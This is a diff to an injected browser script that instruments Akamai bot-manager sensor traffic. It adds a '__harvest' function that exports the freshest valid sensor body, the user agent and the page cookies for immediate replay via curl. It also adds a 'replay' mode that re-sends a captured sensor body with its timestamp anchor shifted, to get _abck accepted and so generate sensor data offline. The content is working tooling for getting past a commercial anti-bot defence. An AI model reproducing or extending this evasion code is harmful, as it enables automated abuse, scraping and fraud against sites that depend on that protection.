@@ -30,6 +30,11 @@
 //        go run . capture-analyze capture/capture-real.json
 //   4. Sanity in console: __decoded(0)  -> decoded plaintext of the 1st POST.
 //
+// HARVEST (the working path — fresh bodies pass): in capture mode, after a POST run
+//   __harvest()  -> downloads harvest.json (freshest body + endpoint + cookies). Then:
+//     go run . harvest capture/harvest.json    # emits a ready-to-POST curl
+//   POST it promptly (timing is checked against session age — stale bodies are rejected).
+//
 // MODES (the fastest path to a verdict): set BEFORE the script posts.
 //   'capture'           (default) observe only
 //   'passthrough'       decode the real body -> re-encode with OUR cipher UNCHANGED
@@ -41,6 +46,9 @@
 //   'mutate:k=v'        decode -> set field "k"=v -> re-encode (isolate one field)
 //   'regen'             keep real section0/meta/seed, refresh `sc` timestamps to now,
 //                       re-encode -> tests capture-assisted GENERATION (not just replay)
+//   'replay'            store the 1st fresh body, then re-send it for every later POST
+//                       with ONLY its anchor epoch shifted to stay coherent (TIMING.md).
+//                       If _abck reaches 0, offline anchor-shift generation works.
 // Apply a mode without incognito:  __run('passthrough')  (sets mode, clears Akamai
 // cookies so _abck restarts at -1, reloads).
 (function () {
@@ -79,6 +87,18 @@
         var b = new Blob([JSON.stringify(window.__cap)], { type: 'application/json' });
         var a = document.createElement('a'); a.href = URL.createObjectURL(b); a.download = 'capture-real.json'; a.click();
     };
+    // HARVESTER: export ONLY the freshest valid sensor body + endpoint + cookies, for
+    // immediate POST elsewhere (the one proven path — fresh bodies pass). Use it right
+    // after a normal (capture-mode) POST; consume within the freshness window.
+    window.__harvest = function () {
+        var p = window.__cap.posts[window.__cap.posts.length - 1];
+        if (!p) { console.log('[harvest] no POSTs captured yet — browse a moment first'); return; }
+        var h = { url: p.url, body: p.body, ua: navigator.userAgent, cookie: document.cookie, t: p.t, harvestedAt: Date.now() };
+        var b = new Blob([JSON.stringify(h)], { type: 'application/json' });
+        var a = document.createElement('a'); a.href = URL.createObjectURL(b); a.download = 'harvest.json'; a.click();
+        console.log('[harvest] latest body (age ' + (Date.now() - p.t) + 'ms) -> harvest.json; status=' + window.__status());
+        return h;
+    };
 
     function flip1(s) { if (!s) return s; var i = Math.floor(s.length / 2); var c = s[i] === 'A' ? 'B' : 'A'; return s.slice(0, i) + c + s.slice(i + 1); }
     function transform(sensor) {
@@ -91,6 +111,24 @@
         else if (mode === 'corrupt:plain') { d.plain = flip1(d.plain); }
         else if (mode.indexOf('mutate:') === 0) {
             mode.slice(7).split(',').forEach(function (p) { var e = p.indexOf('='); if (e < 0) return; var k = p.slice(0, e), v = p.slice(e + 1); d.plain = d.plain.replace(new RegExp('("' + k + '":)("[^"]*"|[^,}]*)'), '$1' + JSON.stringify(v)); });
+        }
+        else if (mode === 'replay') {
+            // coherent-replay (TIMING.md): capture the FIRST fresh body, then for every
+            // later send re-emit that same body with ONLY its anchor epoch shifted so
+            // (sendTime - anchor) stays equal to the original elapsed. Tests whether a
+            // stale body with a corrected anchor is accepted as the session continues —
+            // i.e. whether we can generate offline by anchor-shifting one capture.
+            var nowT = Date.now();
+            if (!window.__replayBody) {
+                var a0 = (d.plain.match(/1[78]\d{11}/) || [])[0];
+                window.__replayBody = { d: d, anchor: a0 ? +a0 : 0, t: nowT };
+                console.log('[replay] stored base body (anchor=' + (a0 || '?') + '); sending real first');
+                return sensor;
+            }
+            var s = window.__replayBody, na = s.anchor + (nowT - s.t);
+            var p2 = s.d.plain.replace(new RegExp(s.anchor, 'g'), String(na));
+            console.log('[replay] anchor ' + s.anchor + ' -> ' + na + ' (age ' + (nowT - s.t) + 'ms)');
+            return encodeV3({ prefix: s.d.prefix, section0: s.d.section0, meta: s.d.meta, seed: s.d.seed, plain: p2 });
         }
         else if (mode === 'regen') {
             // realistic capture-assisted generation: keep the REAL section0/meta/seed,
